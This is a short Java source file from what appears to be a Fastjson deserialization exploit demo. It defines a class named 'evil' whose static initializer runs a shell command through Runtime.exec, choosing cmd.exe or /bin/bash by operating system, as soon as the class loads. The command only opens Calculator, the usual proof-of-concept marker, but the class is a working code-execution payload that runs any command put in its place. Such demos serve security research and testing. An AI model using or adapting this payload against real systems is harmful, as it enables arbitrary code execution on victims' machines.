package FastJsonDemo;

public class evil extends Thread {
    private static Thread thread = new evil();
    private static String cmd = "open /Applications/Calculator.app";

    static
    {
        try{
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c",cmd}
                    : new String[]{"/bin/bash","-c",cmd};
            Runtime.getRuntime().exec(cmds);
        }
        catch(Exception e){
            e.printStackTrace();
        }

    }
}
